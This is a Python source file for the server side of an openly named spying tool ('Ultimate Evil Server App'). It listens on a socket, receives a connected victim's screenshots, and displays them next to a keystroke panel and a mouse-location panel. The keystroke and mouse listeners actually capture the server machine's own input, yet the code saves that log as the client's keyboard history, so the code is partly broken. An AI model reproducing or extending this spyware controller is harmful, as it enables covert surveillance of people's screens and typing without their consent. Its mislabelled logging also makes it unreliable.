# FINAL SERVER CODE
import socket
import tkinter as tk
from PIL import ImageGrab, Image, ImageTk
from io import BytesIO
from pynput import keyboard, mouse
import threading

SERVER_IP = "192.168.14.108"
SERVER_PORT = 8080

class ServerApp:
    def __init__(self, master):
        self.master = master
        master.title("Ultimate Evil Server App")

        # Configure the main window
        master.geometry("1500x800")
        master.configure(bg="#000")

        # Create a frame to hold the labels
        self.frame = tk.Frame(master, bg="#000")
        self.frame.pack()

        # Additional labels
        self.top_label = tk.Label(self.frame, text="Remotely Spying On: -", font=("Courier", 16, "bold"), background='#000', fg='#0F0')
        self.top_label.pack(side=tk.TOP, pady=10)

        # Label for the screen (center)
        self.label = tk.Label(self.frame)
        self.label.pack(side=tk.LEFT, padx=10, pady=10)

        # Label for keyboard presses
        self.keyboard_label = tk.Text(self.frame, wrap="none", height=20, width=30, fg="white", bg="#000", font=("Courier", 12), insertbackground="#0F0")
        self.keyboard_label.pack(side=tk.RIGHT, padx=10, pady=10)

        # Label for mouse location
        self.mouse_label = tk.Label(self.frame, text="Mouse Location:", fg="white", bg="#000", font=("Courier", 12), anchor='w')
        self.mouse_label.pack(side=tk.BOTTOM, padx=10, pady=10)

        # Scrollbar for keyboard label
        self.keyboard_scrollbar = tk.Scrollbar(self.frame, command=self.keyboard_label.yview)
        self.keyboard_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.keyboard_label.config(yscrollcommand=self.keyboard_scrollbar.set)

        # Initialize variables
        self.keyboard_data = ""
        self.mouse_data = ""

        # Set up the server socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((SERVER_IP, SERVER_PORT))
        self.server_socket.listen(1)
        print("Looking for connections...")

        # Accept client connection
        self.client_socket, _ = self.server_socket.accept()
        print("Connection successful!")

        # Set up keyboard and mouse listeners
        self.keyboard_listener = keyboard.Listener(on_press=self.on_keyboard_press)
        self.mouse_listener = mouse.Listener(on_move=self.on_mouse_move)
        self.keyboard_listener.start()
        self.mouse_listener.start()

        # Start the main loop to update the tkinter screen
        self.update_tkinter()

    def on_keyboard_press(self, key):
        try:
            key_str = f"{key.char}"
        except AttributeError:
            key_str = f"{key}"

        # Display the most recent key press at the top
        self.keyboard_data = key_str + "\n" + self.keyboard_data

        # Update the keyboard label
        self.keyboard_label.config(state=tk.NORMAL)
        self.keyboard_label.delete(1.0, tk.END)
        self.keyboard_label.insert(tk.END, self.keyboard_data)
        self.keyboard_label.config(state=tk.DISABLED)

    def on_mouse_move(self, x, y):
        self.mouse_data = f"X: {x}, Y: {y}"

    def update_tkinter(self):
        # Update mouse label
        self.top_label.config(text=f"Remotely Spying On: {self.client_socket.getpeername()[0]}")
        
        # Update the screen label
        size_bytes = b''
        while len(size_bytes) < 4:
            size_bytes += self.client_socket.recv(4 - len(size_bytes))

        size = int.from_bytes(size_bytes, byteorder='big')
        image_bytes = b''

        while len(image_bytes) < size:
            image_bytes += self.client_socket.recv(size - len(image_bytes))

        try:
            image = Image.open(BytesIO(image_bytes))
            resized_image = image.resize((800, 600))
            photo_image = ImageTk.PhotoImage(resized_image)
            self.label.config(image=photo_image)
            self.label.image = photo_image
        except Exception as e:
            print(f"Error: {e}")

        # Update mouse label
        self.mouse_label.config(text=f"Mouse Location: {self.mouse_data}")

        # Schedule the next update after the label has been configured
        self.master.after(10, self.update_tkinter)

    def save_keyboard_history(self):
        # Save keyboard history to a txt file
        with open("client_keyboard.txt", "w") as file:
            file.write(self.keyboard_data)

    def on_closing(self):
        # Stop listeners and save keyboard history before closing
        self.keyboard_listener.stop()
        self.mouse_listener.stop()
        self.save_keyboard_history()
        self.master.destroy()

# Create the main tkinter window
root = tk.Tk()
root.configure(bg="#000")
app = ServerApp(root)
root.protocol("WM_DELETE_WINDOW", app.on_closing)
root.mainloop()
